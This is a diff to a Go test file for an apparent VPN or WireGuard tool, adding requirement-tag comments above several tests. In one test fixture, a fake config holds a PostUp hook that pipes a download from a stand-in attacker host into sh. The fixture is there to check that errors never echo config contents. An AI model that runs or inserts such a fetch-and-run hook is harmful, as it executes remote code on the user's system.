@@ -488,6 +488,7 @@ func mustRead(p string) []byte {
 	return b
 }
 
+// [PH-3] [REL-25] [REL-26] [REL-28] Every root command line, byte for byte.
 func TestTranscriptParity(t *testing.T) {
 	f := newFake(t)
 	ctx := context.Background()
@@ -679,6 +680,7 @@ func TestToolStderrIsFoldedIntoTheError(t *testing.T) {
 
 // A one-shot and a daemon op cannot interleave: the flock is taken by every
 // state-changing verb (deviation 8).
+// [PH-4]
 func TestStateChangingVerbsTakeTheLock(t *testing.T) {
 	f := newFake(t)
 	lock := f.runPath(lockName)
@@ -734,6 +736,7 @@ func TestTunUpKillsTheChildWhenNoInterfaceAppears(t *testing.T) {
 	}
 }
 
+// [PH-4]
 func TestErrorsNeverEchoConfig(t *testing.T) {
 	f := newFake(t)
 	secret := []byte("[Interface]\nPrivateKey = aGVsbG8=\nPostUp = curl http://evil.example/x | sh\n")
